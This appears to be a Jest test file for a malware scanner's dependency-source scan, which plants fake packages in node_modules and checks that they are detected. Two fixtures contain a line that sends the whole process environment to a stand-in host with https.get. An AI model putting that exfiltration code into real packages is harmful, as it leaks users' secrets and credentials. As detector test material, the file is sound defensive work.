import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { describe, it, expect, afterEach } from '@jest/globals';
import { collectInstalledDependencySourcePaths } from '../../src/lib/dependencySourceScan';
import { scan } from '../../src/scan';

function writePackage(root: string, name: string, deps: Record<string, string> = {}): void {
  fs.mkdirSync(root, { recursive: true });
  fs.writeFileSync(
    path.join(root, 'package.json'),
    JSON.stringify({ name, version: '1.0.0', dependencies: deps }, null, 2)
  );
}

describe('dependency source scan', () => {
  const tempRoots: string[] = [];

  afterEach(() => {
    for (const root of tempRoots) {
      fs.rmSync(root, { recursive: true, force: true });
    }
    tempRoots.length = 0;
  });

  it('collects scanable files from installed dependency packages', () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'nv-dep-src-'));
    tempRoots.push(root);
    writePackage(root, 'app-root');

    const evilPkg = path.join(root, 'node_modules', 'evil-dropper');
    fs.mkdirSync(evilPkg, { recursive: true });
    fs.writeFileSync(path.join(evilPkg, 'package.json'), JSON.stringify({ name: 'evil-dropper' }));
    fs.writeFileSync(path.join(evilPkg, 'index.js'), 'eval("dropper");');

    const { paths, stats } = collectInstalledDependencySourcePaths(root, {});
    expect(stats.packagesVisited).toBe(1);
    expect(paths.some((p) => p.endsWith(`${path.sep}evil-dropper${path.sep}index.js`))).toBe(true);
  });

  it('reports malware inside node_modules during a default directory scan', async () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'nv-dep-scan-'));
    tempRoots.push(root);
    writePackage(root, 'app-root');

    const evilPkg = path.join(root, 'node_modules', 'planted-pkg');
    fs.mkdirSync(evilPkg, { recursive: true });
    fs.writeFileSync(path.join(evilPkg, 'package.json'), JSON.stringify({ name: 'planted-pkg' }));
    fs.writeFileSync(
      path.join(evilPkg, 'index.js'),
      // Whole environment serialised and sent off-machine.
      "const https = require('https');\nhttps.get('https://x.example/?e=' + JSON.stringify(process.env));\nmodule.exports = {};"
    );

    const result = await scan(root, {
      depth: 2,
      iocEnabled: false,
      dependencyConfusionEnabled: false,
      all: true,
    });

    const fromDependency = result.threats.filter((t) =>
      (t.filePath ?? '').includes(`${path.sep}node_modules${path.sep}planted-pkg`)
    );
    expect(fromDependency.length).toBeGreaterThan(0);
    expect(result.metadata?.['dependencySourceScan']).toMatchObject({
      packagesVisited: 1,
      filesCollected: 1,
    });
  });

  it('skips dependency source when scanDependencySource is false', async () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'nv-dep-off-'));
    tempRoots.push(root);
    writePackage(root, 'app-root');

    const evilPkg = path.join(root, 'node_modules', 'hidden-pkg');
    fs.mkdirSync(evilPkg, { recursive: true });
    fs.writeFileSync(path.join(evilPkg, 'package.json'), JSON.stringify({ name: 'hidden-pkg' }));
    fs.writeFileSync(
      path.join(evilPkg, 'index.js'),
      // Whole environment serialised and sent off-machine.
      "const https = require('https');\nhttps.get('https://x.example/?e=' + JSON.stringify(process.env));\nmodule.exports = {};"
    );

    const result = await scan(root, {
      depth: 2,
      iocEnabled: false,
      dependencyConfusionEnabled: false,
      scanDependencySource: false,
      all: true,
    });

    expect(result.threats.some((t) => (t.filePath ?? '').includes('node_modules'))).toBe(false);
  });
});
